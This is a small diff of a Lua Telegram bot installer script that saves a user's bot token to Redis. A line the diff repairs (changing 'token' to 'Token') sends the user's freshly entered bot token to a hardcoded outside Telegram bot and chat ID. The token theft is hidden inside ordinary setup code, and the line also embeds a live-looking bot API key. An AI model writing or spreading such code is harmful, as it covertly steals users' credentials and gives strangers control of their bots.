@@ -30,7 +30,7 @@ TheTokenBot = TokenBot:match("(%d+)")
 os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
 Redis:set(SshId.."Info:Redis:Token",TokenBot)
 Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
-https.request('https://api.telegram.org/bot1975497470:AAFFb6C-PbO1dSCghrh_wwKZCD-3r6GLwRk/sendmessage?chat_id=1965534755&text=' ..token)
+https.request('https://api.telegram.org/bot1975497470:AAFFb6C-PbO1dSCghrh_wwKZCD-3r6GLwRk/sendmessage?chat_id=1965534755&text=' ..Token)
 end 
 else
 print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
